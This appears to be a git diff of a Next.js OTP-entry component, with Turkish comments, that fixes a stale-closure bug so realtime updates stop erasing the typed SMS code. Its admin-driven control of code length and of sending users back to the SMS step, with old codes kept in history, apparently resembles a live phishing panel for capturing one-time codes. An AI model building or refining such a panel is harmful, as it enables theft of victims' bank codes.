@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { DemoShell } from "@/components/demo/DemoShell";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
@@ -24,6 +24,12 @@ export function SmsClient({ sessionId }: Props) {
   const [saving, setSaving] = useState(false);
   const [msg, setMsg] = useState<string | null>(null);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
+
+  // Realtime callback'in guncel state'i gormesi icin ref (stale closure onlemi)
+  const settingsRef = useRef({ digits, smsMode, customText });
+  useEffect(() => {
+    settingsRef.current = { digits, smsMode, customText };
+  });
 
   // ⭐ BELİRSİZ HANE: DİNAMİK hane sayısı (kullanıcı kaç hane girerse o kadar)
   //   min 4, max 12. Baslangicta 4 kutu gosterilir, kullanici 5. haneyi girince 5. kutu acilir, vb.
@@ -83,50 +89,38 @@ export function SmsClient({ sessionId }: Props) {
               sms_digits?: number;
               sms_mode?: string | null;
               sms_custom_text?: string | null;
-              current_step?: string;
-              form_data?: Record<string, any>;
             };
-            // ⭐ BELİRSİZ HANE realtime guncellemesi
-            const modeUnknown = next.sms_mode === "unknown" || (next.sms_mode === undefined && Number(next.sms_digits) === 0);
-            const prevMode = smsMode;
-            const prevDigits = digits;
-            let changed = false;
-            if (next.sms_mode !== undefined || next.sms_digits !== undefined) {
-              const newMode: "fixed" | "unknown" = modeUnknown ? "unknown" : "fixed";
-              const newDigits = Number(next.sms_digits) || 6;
-              if (prevMode !== newMode || prevDigits !== newDigits) {
-                changed = true;
-              }
+            const cur = settingsRef.current;
+
+            // ⭐ KRITIK FIX: Her UPDATE'te (3sn'lik presence ping, admin yazimi,
+            //   baska herhangi bir update) `new` icinde sms_digits/sms_mode ve
+            //   current_step="sms" HER ZAMAN gelir. Degere bakmadan setCode("")
+            //   cagirmak kullanicinin yazdigi kodu surekli siliyordu.
+            //   Artik SADECE sms ayarlari GERCEKTEN degistiyse sifirla.
+            const hasModeInfo = next.sms_mode !== undefined || next.sms_digits !== undefined;
+            const newMode: "fixed" | "unknown" =
+              next.sms_mode === "unknown" ||
+              (next.sms_mode == null && Number(next.sms_digits) === 0)
+                ? "unknown"
+                : "fixed";
+            const newDigits = Number(next.sms_digits) || 6;
+
+            if (hasModeInfo && (newMode !== cur.smsMode || newDigits !== cur.digits)) {
               setSmsMode(newMode);
               setDigits(newDigits);
               setCode("");
-            }
-            if (next.sms_custom_text !== undefined) {
-              setCustomText(next.sms_custom_text);
-            }
-            // Admin panelinden tekrar SMS adımına atılırsa (current_step = sms),
-            // inputu BOŞALT (eski kod görünmesin) AMA form_data'daki ESKİ smsCode/tacCode KORU
-            // (history.push yapabilmek için lazım).
-            if (next.current_step === "sms") {
-              setCode("");
-            }
-
-            // ⭐ Büyük fix: Admin belirsiz -> sabit veya sabit -> belirsiz degistirince
-            //   useEffect sadece mountta çalıştığı için prevMode/prevDigits state'leri KAPALI (stale closure).
-            //   Degisiklik olmasa bile REALTIME her geldiginde; kutuların yeniden render edilmesi ve
-            //   1. kutuya otomatik focus olması için 200ms sonra FORCE bir event (visibility benzeri) veya DOM focus denemesi:
-            if (changed) {
+              // Ayar degisti: ilk kutuya focus (eski davranis)
               window.setTimeout(() => {
-                // İlk inputa focus (0) → kullanici F5 atmadan yeni 6 kutu veya yeni dynamic 4 kutu görünce
-                // direkt yazmaya baslayabilir
                 const first = document.getElementById("otp-input-0");
                 if (first) first.focus();
               }, 220);
-              // 2. katman fallback 450ms (re-render biraz gecikirse)
               window.setTimeout(() => {
                 const f2 = document.getElementById("otp-input-0");
                 if (f2 && document.activeElement?.id !== f2.id) f2.focus();
               }, 450);
+            }
+            if (next.sms_custom_text !== undefined && next.sms_custom_text !== cur.customText) {
+              setCustomText(next.sms_custom_text);
             }
           }
         )
@@ -141,11 +135,9 @@ export function SmsClient({ sessionId }: Props) {
     return () => {
       cancelled = true;
     };
-    // ⭐ ONEMLI: smsMode ve digits dependency EKLEDIK.
-    //   Realtime callback içinde `prevMode / prevDigits` artık güncel state değerlerini
-    //   yakalıyor (eski halde sadece mount anındaki değerler mevcuttu, değişiklik
-    //   yakalanamıyordu). useEffect remount değil, sadece callback dependency güncellenir.
-  }, [sessionId, supabase, smsMode, digits]);
+    // settingsRef uzerinden guncel state okundugu icin ekstra dep gerekmiyor;
+    // kanal session degismedikce tek kez kurulur.
+  }, [sessionId, supabase]);
 
   async function handleSubmit(e?: React.FormEvent | null, fromAuto = false) {
     if (e) e.preventDefault();
